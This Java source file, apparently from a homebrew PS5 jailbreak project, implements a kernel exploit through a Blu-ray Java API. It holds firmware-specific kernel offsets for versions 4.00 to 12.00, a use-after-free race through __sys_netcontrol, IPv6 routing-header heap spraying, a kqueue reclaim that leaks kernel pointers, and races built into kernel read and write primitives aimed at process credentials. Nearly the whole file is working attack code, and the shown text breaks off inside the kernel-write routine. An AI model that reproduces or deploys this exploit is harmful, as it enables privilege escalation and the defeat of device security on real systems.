/*
 * Copyright (c) 2026 Jaime
 *
 * This file is part of Poops-PS5-Java and is licensed under the MIT License.
 * See the LICENSE file in the root of the project for full license information.
 */

package org.homebrew;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;

import org.bdj.api.*;
import org.bdj.Status;

public class Poops {
    private static API api;
    private static volatile boolean running = true;

    // --- 1. SYSTEM CONSTANTS (FreeBSD) ---
    private static final int AF_INET6 = 28;
    private static final int SOCK_STREAM = 1;
    private static final int IPPROTO_IPV6 = 41;
    private static final int F_SETFL = 4;
    private static final int O_NONBLOCK = 4;

    // --- 2. POOPS PS5 CONSTANTS ---
    private static final int UCRED_SIZE = 360; 
    private static final long RTHDR_TAG = 0x13370000L;
    private static final int MSG_IOV_NUM = 23;

    private static final int TRIPLEFREE_ATTEMPTS = 8;
    private static final int MAX_ROUNDS_TWIN = 15000;
    private static final int MAX_ROUNDS_TRIPLET = 50000;

    private static final int KQ_FDP = 0xA8;
    private static final int FILEDESC_OFILES = 0x00;
    private static final int FDESCENTTBL_HDR = 0x08;
    private static final int FILEDESCENT_SIZE = 0x30;
    private static final int PROC_PID = 0xBC;
    private static final int PROC_UCRED = 0x40;
    private static final int PROC_FD = 0x48;
    private static final int PIPE_SIGIO = 0xD8;
    private static final int FD_RDIR = 0x10;
    private static final int FD_JDIR = 0x18;
    private static final int UCRED_CR_UID = 0x04;
    private static final int UCRED_CR_RUID = 0x08;
    private static final int UCRED_CR_SVUID = 0x0C;
    private static final int UCRED_CR_NGROUPS = 0x10;
    private static final int UCRED_CR_RGID = 0x14;
    private static final int UCRED_CR_PRISON = 0x30;
    private static final int UCRED_CR_SCEAUTHID = 0x58;
    private static final int UCRED_CR_SCECAPS0 = 0x60;
    private static final int UCRED_CR_SCECAPS1 = 0x68;

    private static final int PROC_VM_SPACE = 0x200;
    private static final int PMAP_CR3 = 0x28;
    private static final int PMAP_PML4 = 0x20;
    private static final int SIZEOF_GVMSPACE = 0x100;
    private static final int GVMSPACE_START_VA = 0x08;
    private static final int GVMSPACE_SIZE = 0x10;
    private static final int GVMSPACE_PAGE_DIR = 0x38;
    private static final int INPCB_PKTOPTS = 0x120;
    private static final int IP6PO_RTHDR = 0x70;
    private static int uafSocket = -1;

    // --- DYNAMIC FIRMWARE OFFSETS ---
    private static long ALLPROC;
    private static long SECURITY_FLAGS;
    private static long KERNEL_PMAP_STORE;
    private static long GVMSPACE;
    private static long DATA_BASE_OFF;
    private static long ROOTVNODE;

    private static WorkerState iovState = new WorkerState(4);
    private static final int COMMAND_UIO_READ = 0;
    private static final int COMMAND_UIO_WRITE = 1;
    private static WorkerState uioState = new WorkerState(4); 
    private static IovThread[] iov_threads = new IovThread[4];
    private static UioThread[] uio_threads = new UioThread[4];

    // --- 3. SYSCALLS ---
    private static long libkernel;
    private static long sys_read, sys_write, sys_pipe, sys_socket, sys_fcntl;
    private static long sys_scePthreadCreate;
    private static long sys_setsockopt, sys_getsockopt, sys_netcontrol;
    private static long sys_setuid, sys_dup, sys_close, sys_sched_yield;
    private static long sys_socketpair, sys_readv, sys_writev, sys_recvmsg;
    private static long sys_cpuset_setaffinity, sys_rtprio_thread;
    private static long sys_kqueue;
    private static int uio_sock_a, uio_sock_b, iov_sock_a, iov_sock_b;
    private static Buffer recvmsg_hdr, recvmsg_iovecs;
    private static Buffer uio_read_buf, uio_write_buf;
    private static Buffer uio_iov_read, uio_iov_write;
    private static Buffer[] kread_result_bufs = new Buffer[4];
    private static Buffer kread_sndbuf, kwrite_sndbuf, len_out, rthdr_readback, scratch_big, dummy_byte;
    private static int masterRfd, masterWfd;
    private static int victimRfd, victimWfd;
    private static long sys_getpid, sys_ioctl;
    private static long sys_open, sys_mprotect, sys_nanosleep;
    private static long sys_alloc_dmem, sys_map_dmem;
    private static long sys_syscall, sys_scePthreadJoin;
    private static long sys_lseek, sys_mmap;
    private static long sys_jitshm_create, sys_jitshm_alias;
    private static long sys_sysctlbyname;
    private static long sys_kill;


    // --- SHARED KERNEL VARIABLES ---
    public static long dataBase = 0;

    // --- SLEEP BUFFER ---
    private static Buffer ksleep_ts;

    // --- NATIVE KERNEL SLEEP ---
    public static void ksleep(long millis) {
        if (ksleep_ts == null) ksleep_ts = new Buffer(16);
        ksleep_ts.putLong(0, millis / 1000L);
        ksleep_ts.putLong(8, (millis % 1000L) * 1000000L);
        api.call(sys_nanosleep, ksleep_ts.address(), 0L);
    }

    // --- 4. LIBRARY RESOLUTION ---
    public static boolean resolveSyscalls() {
        try {
            libkernel = api.dlsym(API.RTLD_DEFAULT, "libkernel.sprx");
            if (libkernel == 0) libkernel = API.LIBKERNEL_MODULE_HANDLE;

            sys_read = api.dlsym(libkernel, "read");
            sys_write = api.dlsym(libkernel, "write");
            sys_pipe = api.dlsym(libkernel, "pipe");
            sys_socket = api.dlsym(libkernel, "socket");
            sys_fcntl = api.dlsym(libkernel, "fcntl");
            sys_scePthreadCreate = api.dlsym(libkernel, "scePthreadCreate");
            sys_setsockopt = api.dlsym(libkernel, "setsockopt");
            sys_getsockopt = api.dlsym(libkernel, "getsockopt");
            sys_netcontrol = api.dlsym(libkernel, "__sys_netcontrol");
            sys_setuid = api.dlsym(libkernel, "setuid");
            sys_dup = api.dlsym(libkernel, "dup");
            sys_close = api.dlsym(libkernel, "close");
            sys_sched_yield = api.dlsym(libkernel, "sched_yield");
            sys_kqueue = api.dlsym(libkernel, "kqueue");
            sys_socketpair = api.dlsym(libkernel, "socketpair");
            sys_readv = api.dlsym(libkernel, "readv");
            sys_writev = api.dlsym(libkernel, "writev");
            sys_recvmsg = api.dlsym(libkernel, "recvmsg");
            sys_cpuset_setaffinity = api.dlsym(libkernel, "cpuset_setaffinity");
            sys_rtprio_thread = api.dlsym(libkernel, "rtprio_thread");
            sys_getpid = api.dlsym(libkernel, "getpid");
            sys_ioctl = api.dlsym(libkernel, "ioctl");
            sys_open = api.dlsym(libkernel, "open");
            sys_mprotect = api.dlsym(libkernel, "mprotect");
            sys_nanosleep = api.dlsym(libkernel, "nanosleep");
            sys_alloc_dmem = api.dlsym(libkernel, "sceKernelAllocateMainDirectMemory");
            sys_map_dmem = api.dlsym(libkernel, "sceKernelMapDirectMemory");
            sys_syscall = api.dlsym(libkernel, "syscall");
            sys_scePthreadJoin = api.dlsym(libkernel, "scePthreadJoin");
            sys_lseek = api.dlsym(libkernel, "lseek");
            sys_mmap = api.dlsym(libkernel, "mmap");
            sys_jitshm_create = api.dlsym(libkernel, "sceKernelJitCreateSharedMemory");
            sys_jitshm_alias = api.dlsym(libkernel, "sceKernelJitCreateAliasOfSharedMemory");
            sys_sysctlbyname = api.dlsym(libkernel, "sysctlbyname");
            sys_kill = api.dlsym(libkernel, "kill");

            return (sys_pipe != 0 && sys_socket != 0 && sys_netcontrol != 0 && sys_kqueue != 0);
        } catch (Exception e) {
            Status.printStackTrace("[!] Error resolving syscalls", e);
            return false;
        }
    }

    public static boolean initOffsets(String fw) {
        if (fw == null) {
            Status.println("[!] ERROR: Firmware version is null.");
            return false;
        }

        int major = 0;
        int minor = 0;
        
        try {
            int dotIndex = fw.indexOf('.');
            if (dotIndex > 0) {
                major = Integer.parseInt(fw.substring(0, dotIndex));
                minor = Integer.parseInt(fw.substring(dotIndex + 1));
            } else {
                major = Integer.parseInt(fw);
            }
        } catch (Exception e) {
            Status.println("[!] ERROR: Invalid firmware version format: ".concat(fw));
            return false;
        }

        String targetFw = "";

        if (major == 4) targetFw = "4.00";
        else if (major == 5) {
            if (minor >= 50) targetFw = "5.50";
            else targetFw = "5.00";
        }
        else if (major == 6) targetFw = "6.00";
        else if (major == 7) targetFw = "7.00";
        else if (major == 8) targetFw = "8.00";
        else if (major == 9) {
            if (minor == 0) targetFw = "9.00";
            else targetFw = "9.05";
        }
        else if (major == 10) targetFw = "10.00";
        else if (major == 11) targetFw = "11.00";
        else if (major == 12) targetFw = "12.00";
        else {
            Status.println("[!] ERROR: Major Firmware ".concat(String.valueOf(major)).concat(".xx is not supported."));
            return false;
        }

        Status.println("[i] Auto-mapped FW ".concat(fw).concat(" to closest base offsets: ").concat(targetFw));

        if (targetFw.equals("4.00")) {
            DATA_BASE_OFF = 0x0C00000L; ALLPROC = 0x027EDCB8L; SECURITY_FLAGS = 0x06506474L; ROOTVNODE = 0x066E74C0L; KERNEL_PMAP_STORE = 0x03257A78L; GVMSPACE = 0x064C3F80L;
        } else if (targetFw.equals("5.00")) {
            DATA_BASE_OFF = 0x0C40000L; ALLPROC = 0x0291DD00L; SECURITY_FLAGS = 0x066466ECL; ROOTVNODE = 0x06853510L; KERNEL_PMAP_STORE = 0x03398A88L; GVMSPACE = 0x06603FB0L;
        } else if (targetFw.equals("5.50")) {
            DATA_BASE_OFF = 0x0C40000L; ALLPROC = 0x0291DD00L; SECURITY_FLAGS = 0x066466ECL; ROOTVNODE = 0x06853510L; KERNEL_PMAP_STORE = 0x03394A88L; GVMSPACE = 0x06603FB0L;
        } else if (targetFw.equals("6.00")) {
            DATA_BASE_OFF = 0x0C60000L; ALLPROC = 0x02869D20L; SECURITY_FLAGS = 0x065968ECL; ROOTVNODE = 0x0679F510L; KERNEL_PMAP_STORE = 0x032E4358L; GVMSPACE = 0x065540F0L;
        } else if (targetFw.equals("7.00")) {
            DATA_BASE_OFF = 0x0C50000L; ALLPROC = 0x02859D50L; SECURITY_FLAGS = 0x00AC8064L; ROOTVNODE = 0x030C7510L; KERNEL_PMAP_STORE = 0x02E2C848L; GVMSPACE = 0x02E76090L;
        } else if (targetFw.equals("8.00")) {
            DATA_BASE_OFF = 0x0C70000L; ALLPROC = 0x02875D50L; SECURITY_FLAGS = 0x00AC3064L; ROOTVNODE = 0x030FB510L; KERNEL_PMAP_STORE = 0x02E48848L; GVMSPACE = 0x02EAA090L;
        } else if (targetFw.equals("9.00")) {
            DATA_BASE_OFF = 0x0CA0000L; ALLPROC = 0x02755D50L; SECURITY_FLAGS = 0x00D72064L; ROOTVNODE = 0x02FDB510L; KERNEL_PMAP_STORE = 0x02D28B78L; GVMSPACE = 0x02D8A570L;
        } else if (targetFw.equals("9.05")) {
            DATA_BASE_OFF = 0x0CA0000L; ALLPROC = 0x02755D50L; SECURITY_FLAGS = 0x00D73064L; ROOTVNODE = 0x02FDB510L; KERNEL_PMAP_STORE = 0x02D28B78L; GVMSPACE = 0x02D8A570L;
        } else if (targetFw.equals("10.00")) {
            DATA_BASE_OFF = 0x0CC0000L; ALLPROC = 0x02765D70L; SECURITY_FLAGS = 0x00D79064L; ROOTVNODE = 0x02FA3510L; KERNEL_PMAP_STORE = 0x02CF0EF8L; GVMSPACE = 0x02D52570L;
        } else if (targetFw.equals("11.00")) {
            DATA_BASE_OFF = 0x0D30000L; ALLPROC = 0x02875D70L; SECURITY_FLAGS = 0x00D8C064L; ROOTVNODE = 0x030B7510L; KERNEL_PMAP_STORE = 0x02E04F18L; GVMSPACE = 0x02E66570L;
        } else if (targetFw.equals("12.00")) {
            DATA_BASE_OFF = 0x0D50000L; ALLPROC = 0x02885E00L; SECURITY_FLAGS = 0x00D83064L; ROOTVNODE = 0x030D7510L; KERNEL_PMAP_STORE = 0x02E1CFB8L; GVMSPACE = 0x02E7E570L;
        }
        
        Status.println("[+] Core offsets loaded successfully.");
        return true;
    }

    // --- 5. PREPARATION FUNCTIONS (STAGE 0) ---
    public static int[] createPipePair() {
        Int32Array fds = new Int32Array(2);
        long res = api.call(sys_pipe, fds.address());
        if (res != 0) return null;

        int r = fds.get(0);
        int w = fds.get(1);

        api.call(sys_fcntl, r, F_SETFL, O_NONBLOCK);
        api.call(sys_fcntl, w, F_SETFL, O_NONBLOCK);

        return new int[]{r, w};
    }

    private static int[] ipv6_sockets = new int[64];
    private static int ipv6_count = 0;
    private static int[] triplets = {-1, -1, -1};

    public static int buildRthdr(Buffer buf, int targetSize) {
        int segments = ((targetSize >> 3) - 1) & 0xFFFFFFFE;
        buf.putByte(0, (byte) 0);
        buf.putByte(1, (byte) segments);
        buf.putByte(2, (byte) 0);
        buf.putByte(3, (byte) (segments >> 1));
        return (segments + 1) << 3;
    }

    public static void freeRthdr(int sock) {
        api.call(sys_setsockopt, sock, IPPROTO_IPV6, 51, 0, 0);
    }

    public static void setRthdr(int sock, Buffer buf, int len) {
        api.call(sys_setsockopt, sock, IPPROTO_IPV6, 51, buf.address(), len);
    }

    public static int getRthdr(int sock, Buffer buf, Buffer lenPtr) {
        return (int) api.call(sys_getsockopt, sock, IPPROTO_IPV6, 51, buf.address(), lenPtr.address());
    }

    public static int[] findTwins(int maxRounds, Buffer rthdrSpray, int sprayLen, Buffer tagBuf, Buffer tagLen) {
        for (int round = 1; round <= maxRounds; round++) {
            for (int i = 0; i < ipv6_count; i++) {
                rthdrSpray.putInt(4, (int)(RTHDR_TAG + i));
                setRthdr(ipv6_sockets[i], rthdrSpray, sprayLen);
            }
            for (int i = 0; i < ipv6_count; i++) {
                tagLen.putInt(0, 8);
                if (getRthdr(ipv6_sockets[i], tagBuf, tagLen) >= 0) {
                    long val = tagBuf.getInt(4) & 0xFFFFFFFFL;
                    int j = (int)(val & 0xFFFF);
                    if ((val & 0xFFFF0000L) == RTHDR_TAG && i != j && j < ipv6_count) {
                        return new int[]{i, j};
                    }
                }
            }
            if (round % 50 == 0) api.call(sys_sched_yield);
        }
        return null;
    }

    public static int findTriplet(int masterIdx, int excludeIdx, int maxRounds, Buffer rthdrSpray, int sprayLen, Buffer tagBuf, Buffer tagLen) {
        for (int round = 1; round <= maxRounds; round++) {
            for (int i = 0; i < ipv6_count; i++) {
                if (i != masterIdx && i != excludeIdx) {
                    rthdrSpray.putInt(4, (int)(RTHDR_TAG + i));
                    setRthdr(ipv6_sockets[i], rthdrSpray, sprayLen);
                }
            }
            tagLen.putInt(0, 8);
            if (getRthdr(ipv6_sockets[masterIdx], tagBuf, tagLen) >= 0) {
                long val = tagBuf.getInt(4) & 0xFFFFFFFFL;
                int j = (int)(val & 0xFFFF);
                if ((val & 0xFFFF0000L) == RTHDR_TAG && j != masterIdx && j != excludeIdx && j < ipv6_count) {
                    return j;
                }
            }
            if (round % 100 == 0) api.call(sys_sched_yield);
        }
        return -1;
    }

    // --- 6. THE WORKERS (SLOW WORKERS & WORKER STATE) ---
    public static void pinThread() {
        Buffer cpuMask = new Buffer(16);
        cpuMask.putShort(0, (short)0x10);
        api.call(sys_cpuset_setaffinity, 3L, 1L, -1L, 16L, cpuMask.address());
        Buffer rtParams = new Buffer(4);
        rtParams.putShort(0, (short)2);
        rtParams.putShort(2, (short)256);
        api.call(sys_rtprio_thread, 1L, 0L, rtParams.address());
    }

    public static void unpinThread() {
        Buffer cpuMask = new Buffer(16);
        cpuMask.fill((byte)0xFF); 
        api.call(sys_cpuset_setaffinity, 3L, 1L, -1L, 16L, cpuMask.address());
        Buffer rtParams = new Buffer(4);
        rtParams.putShort(0, (short)3);
        rtParams.putShort(2, (short)0);
        api.call(sys_rtprio_thread, 1L, 0L, rtParams.address());
    }

    public static class WorkerState {
        private final int totalWorkers;
        private int workersStartedWork = 0;
        private int workersFinishedWork = 0;
        private int workCommand = -1;

        public WorkerState(int totalWorkers) {
            this.totalWorkers = totalWorkers;
        }

        public synchronized void signalWork(int command) {
            if (!running) return;
            workersStartedWork = 0;
            workersFinishedWork = 0;
            workCommand = command;
            notifyAll();
            while (workersStartedWork < totalWorkers && running) {
                try { wait(); } catch (Exception e) {}
            }
        }

        public synchronized void waitForFinished() {
            while (workersFinishedWork < totalWorkers && running) {
                try { wait(); } catch (Exception e) {}
            }
            workCommand = -1;
        }

        public synchronized int waitForWork() {
            while (workCommand == -1 || workersFinishedWork != 0) {
                if (!running) return -1;
                try { wait(); } catch (Exception e) {}
            }
            workersStartedWork++;
            if (workersStartedWork == totalWorkers) {
                notifyAll();
            }
            return workCommand;
        }

        public synchronized void signalFinished() {
            workersFinishedWork++;
            if (workersFinishedWork == totalWorkers) {
                notifyAll();
            }
        }
    }

    public static class IovThread extends Thread {
        private final WorkerState state;
        public IovThread(WorkerState state) { this.state = state; }

        public void run() {
            pinThread();
            try {
                while (running) {
                    state.waitForWork();
                    if (!running) break;
                                        api.call(sys_recvmsg, iov_sock_a, recvmsg_hdr.address(), 0L);
                    state.signalFinished();
                }
            } catch (Exception e) {}
            unpinThread();
        }
    }

    public static class UioThread extends Thread {
        private final WorkerState state;
        public UioThread(WorkerState state) { this.state = state; }

        public void run() {
            pinThread(); 
            try {
                while (running) {
                    int command = state.waitForWork();
                    if (!running) break;
                    if (command == COMMAND_UIO_READ) {
                        api.call(sys_writev, uio_sock_b, uio_iov_read.address(), 20L); 
                    } else if (command == COMMAND_UIO_WRITE) {
                        api.call(sys_readv, uio_sock_a, uio_iov_write.address(), 20L); 
                    }
                    state.signalFinished();
                }
            } catch (Exception e) {}
            unpinThread();
        }
    }

    // --- 7. STAGE 1: THE RACE ATTEMPT (UAF via netcontrol) ---
    public static boolean attemptRace(Buffer leakRthdr, Buffer tagBuf, Buffer tagLen) {
        for (int i = 0; i < ipv6_count; i++) freeRthdr(ipv6_sockets[i]);

        int discardSock = (int) api.call(sys_socket, 1, SOCK_STREAM, 0); 
        Buffer sockBuf = new Buffer(8);
        sockBuf.putInt(0, discardSock);
        
        api.call(sys_netcontrol, -1, 0x20000003L, sockBuf.address(), 8);
        api.call(sys_close, discardSock);
        api.call(sys_setuid, 1);

        uafSocket = (int) api.call(sys_socket, 1, SOCK_STREAM, 0);
        api.call(sys_setuid, 1);

        Buffer ctrlBuf = new Buffer(8);
        ctrlBuf.putInt(0, uafSocket);
        api.call(sys_netcontrol, -1, 0x20000007L, ctrlBuf.address(), 8);

        for (int i = 0; i < 32; i++) {
            iovState.signalWork(0);
            api.call(sys_sched_yield);
            api.call(sys_write, iov_sock_b, scratch_big.address(), 8);
            iovState.waitForFinished();
            api.call(sys_read, iov_sock_a, dummy_byte.address(), 8);
        }

        int dupFd = (int) api.call(sys_dup, uafSocket);
        if (dupFd > -1) api.call(sys_close, dupFd);

        int[] twins = findTwins(MAX_ROUNDS_TWIN, leakRthdr, buildRthdr(leakRthdr, UCRED_SIZE), tagBuf, tagLen);
        if (twins == null) {
            api.call(sys_close, uafSocket);
            return false;
        }

        freeRthdr(ipv6_sockets[twins[1]]);
        api.call(sys_sched_yield);
        api.call(sys_sched_yield);
        ksleep(1);

        boolean reclaimed = false;
        
        for (int round = 0; round < MAX_ROUNDS_TRIPLET; round++) {
            iovState.signalWork(0);
            api.call(sys_sched_yield);
            
            tagLen.putInt(0, 8);
            api.call(sys_getsockopt, ipv6_sockets[twins[0]], IPPROTO_IPV6, 51, tagBuf.address(), tagLen.address());
            
            if (tagBuf.getInt(0) == 1) { 
                reclaimed = true;
                break;
            }
            api.call(sys_write, iov_sock_b, scratch_big.address(), 8);
            iovState.waitForFinished();
            api.call(sys_read, iov_sock_a, dummy_byte.address(), 8);
        }

        if (!reclaimed) {
            api.call(sys_close, uafSocket);
            return false;
        }
        
        triplets[0] = twins[0];

        dupFd = (int) api.call(sys_dup, uafSocket);
        if (dupFd > -1) api.call(sys_close, dupFd);
        api.call(sys_sched_yield);

        triplets[1] = findTriplet(triplets[0], -1, MAX_ROUNDS_TRIPLET, leakRthdr, buildRthdr(leakRthdr, UCRED_SIZE), tagBuf, tagLen);
        api.call(sys_write, iov_sock_b, scratch_big.address(), 8);
        
        if (triplets[1] == -1) {
            iovState.waitForFinished();
            api.call(sys_read, iov_sock_a, dummy_byte.address(), 8);
            api.call(sys_close, uafSocket);
            return false;
        }

        api.call(sys_sched_yield);
        triplets[2] = findTriplet(triplets[0], triplets[1], MAX_ROUNDS_TRIPLET, leakRthdr, buildRthdr(leakRthdr, UCRED_SIZE), tagBuf, tagLen);
        iovState.waitForFinished();
        api.call(sys_read, iov_sock_a, dummy_byte.address(), 8);

        if (triplets[2] == -1) {
            api.call(sys_close, uafSocket);
            return false;
        }

        return true;
    }

    // --- 8. STAGE 2: KQUEUE RECLAIM ---
    public static long reclaimKqueue(Buffer leakRthdr, Buffer tagBuf, Buffer tagLen) {
        freeRthdr(ipv6_sockets[triplets[1]]);
        api.call(sys_sched_yield);
        api.call(sys_sched_yield);

        long proc_filedesc = 0;
        boolean kqFound = false;
        int[] kqBatch = new int[8];
        int kqCount = 0;

        Buffer rthdrReadback = new Buffer(UCRED_SIZE);

        for (int i = 0; i < 5000; i++) {
            int kq = (int) api.call(sys_kqueue);
            
            if (kq < 0) {
                for (int j = 0; j < kqCount; j++) api.call(sys_close, kqBatch[j]);
                kqCount = 0;
                api.call(sys_sched_yield);
            } else {
                kqBatch[kqCount++] = kq;
                tagLen.putInt(0, 256);
                getRthdr(ipv6_sockets[triplets[0]], rthdrReadback, tagLen);

                if (rthdrReadback.getInt(8) == 0x1430000 && rthdrReadback.getLong(KQ_FDP) != 0) {
                    kqFound = true;
                    for (int j = 0; j < kqCount; j++) {
                        if (kqBatch[j] != kq) api.call(sys_close, kqBatch[j]);
                    }
                    proc_filedesc = rthdrReadback.getLong(KQ_FDP);
                    api.call(sys_close, kq);
                    break;
                }

                if (kqCount >= 8) {
                    for (int j = 0; j < kqCount; j++) api.call(sys_close, kqBatch[j]);
                    kqCount = 0;
                    api.call(sys_sched_yield);
                }
            }
        }

        if (!kqFound) {
            for (int j = 0; j < kqCount; j++) api.call(sys_close, kqBatch[j]);
            Status.println("[!] Failure: Could not catch the Kqueue.");
            return 0;
        }

        if ((proc_filedesc >>> 48) != 0xFFFF) return 0;
        Status.println("[+] proc_filedesc = 0x".concat(Long.toHexString(proc_filedesc)));

        for (int i = 0; i < 3; i++) {
            triplets[1] = findTriplet(triplets[0], triplets[2], MAX_ROUNDS_TRIPLET, leakRthdr, buildRthdr(leakRthdr, UCRED_SIZE), tagBuf, tagLen);
            if (triplets[1] != -1) break;
            api.call(sys_sched_yield);
            ksleep(10);
        }
        
        if (triplets[1] == -1) {
            Status.println("[!] Failure: Could not repair the triplet.");
            return 0;
        }

        return proc_filedesc;
    }

    // --- 9. SLOW READ PREPARATION ---
    public static void setupSlowRW() {
        Buffer sv = new Buffer(8);
        api.call(sys_socketpair, 1, SOCK_STREAM, 0, sv.address());
        uio_sock_a = sv.getInt(0); uio_sock_b = sv.getInt(4);
        
        api.call(sys_socketpair, 1, SOCK_STREAM, 0, sv.address());
        iov_sock_a = sv.getInt(0); iov_sock_b = sv.getInt(4);

        recvmsg_iovecs = new Buffer(MSG_IOV_NUM * 16);
        recvmsg_iovecs.fill((byte)0);
        recvmsg_iovecs.putLong(0, 1); recvmsg_iovecs.putLong(8, 1);

        recvmsg_hdr = new Buffer(0x38);
        recvmsg_hdr.fill((byte)0);
        recvmsg_hdr.putLong(0x10, recvmsg_iovecs.address());
        recvmsg_hdr.putLong(0x18, MSG_IOV_NUM);

        uio_read_buf = new Buffer(64);
        uio_write_buf = new Buffer(64);
        for(int i = 0; i < 56; i += 8) uio_read_buf.putLong(i, 0x4141414141414141L);

        uio_iov_read = new Buffer(20 * 16);
        uio_iov_read.fill((byte)0);
        uio_iov_read.putLong(0, uio_read_buf.address()); uio_iov_read.putLong(8, 8);

        uio_iov_write = new Buffer(20 * 16);
        uio_iov_write.fill((byte)0);
        uio_iov_write.putLong(0, uio_write_buf.address()); uio_iov_write.putLong(8, 8);

        for (int i = 0; i < 4; i++) kread_result_bufs[i] = new Buffer(64);
        kread_sndbuf = new Buffer(4);
        kwrite_sndbuf = new Buffer(4);
        len_out = new Buffer(4);
        rthdr_readback = new Buffer(UCRED_SIZE);
        scratch_big = new Buffer(0x4000);
        dummy_byte = new Buffer(8);

        for(int i = 0; i < 4; i++) {
            iov_threads[i] = new IovThread(iovState);
            uio_threads[i] = new UioThread(uioState);
            iov_threads[i].start();
            uio_threads[i].start();
        }
    }

    // --- 10. THE SLOW RACE (SLOW R/W PRIMITIVES) ---
    public static void buildUio(Buffer buf, long iovPtr, long td, boolean isRead, long kaddr, long size) {
        buf.putLong(0, iovPtr);
        buf.putLong(8, 20); // UIO_IOV_COUNT = 20
        buf.putLong(16, -1L);
        buf.putLong(24, size);
        buf.putInt(32, 1);  // UIO_SYSSPACE = 1
        buf.putInt(36, isRead ? 1 : 0);
        buf.putLong(40, td);
        buf.putLong(48, kaddr);
        buf.putLong(56, size);
    }

    public static Buffer kreadSlow(long kaddr, int size) {
        if (triplets[0] < 0 || triplets[1] < 0 || triplets[2] < 0) return null;

        for (int i = 0; i < 56; i += 8) uio_read_buf.putLong(i, 0x4141414141414141L);
        for (int i = 0; i < 4; i++) kread_result_bufs[i].fill((byte)0);

        kread_sndbuf.putInt(0, size);
        api.call(sys_setsockopt, uio_sock_b, 0xFFFF, 0x1001, kread_sndbuf.address(), 4);
        
        api.call(sys_write, uio_sock_b, scratch_big.address(), size);
        uio_iov_read.putLong(8, size);

        freeRthdr(ipv6_sockets[triplets[1]]);
        api.call(sys_sched_yield);

        int uioIters = 0;
        while (true) {
            uioState.signalWork(COMMAND_UIO_READ);
            api.call(sys_sched_yield);
            
            len_out.putInt(0, 16);
            getRthdr(ipv6_sockets[triplets[0]], rthdr_readback, len_out);
            
            if (rthdr_readback.getInt(8) == 20) break;
            
            api.call(sys_read, uio_sock_a, scratch_big.address(), size);
            for (int i = 0; i < 4; i++) api.call(sys_read, uio_sock_a, kread_result_bufs[i].address(), size);
            
            uioState.waitForFinished();
            api.call(sys_write, uio_sock_b, scratch_big.address(), size);
            uioIters++;
            if (uioIters > 5000) return null;
        }

        long leakedIov = rthdr_readback.getLong(0);
        if (leakedIov == 0 || (leakedIov >>> 48) != 0xFFFF) {
            api.call(sys_read, uio_sock_a, scratch_big.address(), size);
            for (int i = 0; i < 4; i++) api.call(sys_read, uio_sock_a, kread_result_bufs[i].address(), size);
            uioState.waitForFinished();
            return null;
        }

        buildUio(recvmsg_iovecs, leakedIov, 0, true, kaddr, size);

        freeRthdr(ipv6_sockets[triplets[2]]);
        api.call(sys_sched_yield);

        int iovIters = 0;
        while (true) {
            iovState.signalWork(0); 
            for (int i = 0; i < 5; i++) api.call(sys_sched_yield);
            
            len_out.putInt(0, 64);
            getRthdr(ipv6_sockets[triplets[0]], rthdr_readback, len_out);
            
            if (rthdr_readback.getInt(32) == 1) break;
            
            api.call(sys_write, iov_sock_b, scratch_big.address(), 8);
            iovState.waitForFinished();
            api.call(sys_read, iov_sock_a, dummy_byte.address(), 8);
            iovIters++;
            if (iovIters > 5000) {
                api.call(sys_read, uio_sock_a, scratch_big.address(), size);
                for (int i = 0; i < 4; i++) api.call(sys_read, uio_sock_a, kread_result_bufs[i].address(), size);
                uioState.waitForFinished();
                return null;
            }
        }

        api.call(sys_read, uio_sock_a, scratch_big.address(), size);
        Buffer result = null;
        for (int i = 0; i < 4; i++) {
            api.call(sys_read, uio_sock_a, kread_result_bufs[i].address(), size);
            if (kread_result_bufs[i].getLong(0) != 0x4141414141414141L) {
                triplets[1] = findTriplet(triplets[0], -1, MAX_ROUNDS_TRIPLET, rthdr_readback, buildRthdr(rthdr_readback, UCRED_SIZE), dummy_byte, len_out);
                if (triplets[1] == -1) {
                    Status.println("[!] kreadSlow triplet failure 1");
                    return null;
                }
                result = kread_result_bufs[i];
            }
        }
        
        uioState.waitForFinished();
        api.call(sys_write, iov_sock_b, scratch_big.address(), 8);
        
        triplets[2] = findTriplet(triplets[0], triplets[1], MAX_ROUNDS_TRIPLET, rthdr_readback, buildRthdr(rthdr_readback, UCRED_SIZE), dummy_byte, len_out);
        if (triplets[2] == -1) {
            Status.println("[!] kreadSlow triplet failure 2");
            return null;
        }
        
        iovState.waitForFinished();
        api.call(sys_read, iov_sock_a, dummy_byte.address(), 8);

        if (result == null) return kread_result_bufs[0];
        return result;
    }

    public static long kslow64(long kaddr, Buffer leakRthdr, Buffer tagBuf, Buffer tagLen) {
        int rthdrSize = buildRthdr(leakRthdr, UCRED_SIZE);
        for (int attempt = 0; attempt < 15; attempt++) { 
            if (triplets[0] >= 0 && triplets[1] >= 0 && triplets[2] >= 0) {
                Buffer buf = kreadSlow(kaddr, 8);
                if (buf != null) {
                    return buf.getLong(0); 
                }
            }
            api.call(sys_sched_yield);
            triplets[1] = findTriplet(triplets[0], -1, MAX_ROUNDS_TRIPLET, leakRthdr, rthdrSize, tagBuf, tagLen);
            if (triplets[1] != -1) {
                triplets[2] = findTriplet(triplets[0], triplets[1], MAX_ROUNDS_TRIPLET, leakRthdr, rthdrSize, tagBuf, tagLen);
            }
            ksleep(5);
        }
        return 0;
    }

    public static boolean kwriteSlow(long kaddr, Buffer data, int dataSize) {
        if (triplets[0] < 0 || triplets[1] < 0 || triplets[2] < 0) return false;

        kwrite_sndbuf.putInt(0, dataSize);
        api.call(sys_setsockopt, uio_sock_b, 0xFFFF, 0x1001, kwrite_sndbuf.address(), 4);
        uio_iov_write.putLong(8, dataSize);

        freeRthdr(ipv6_sockets[triplets[1]]);
        api.call(sys_sched_yield);

        int uioIters = 0;
        while (true) {
            uioState.signalWork(COMMAND_UIO_WRITE);
            api.call(sys_sched_yield);
            
            len_out.putInt(0, 16);
            getRthdr(ipv6_sockets[triplets[0]], rthdr_readback, len_out);
            
            if (rthdr_readback.getInt(8) == 20) break;
            for (int i = 0; i < 4; i++) api.call(sys_write, uio_sock_b, data.address(), dataSize);
            
            uioState.waitForFinished();
            uioIters++;
            if (uioIters > 5000) return false;
        }

        long leakedIov = rthdr_readback.getLong(0);
        if (leakedIov == 0 || (leakedIov >>> 48) != 0xFFFF) {
            for (int i = 0; i < 4; i++) api.call(sys_write, uio_sock_b, data.address(), dataSize);
            uioState.waitForFinished();
            return false;
        }

        buildUio(recvmsg_iovecs, leakedIov, 0, false, kaddr, dataSize);

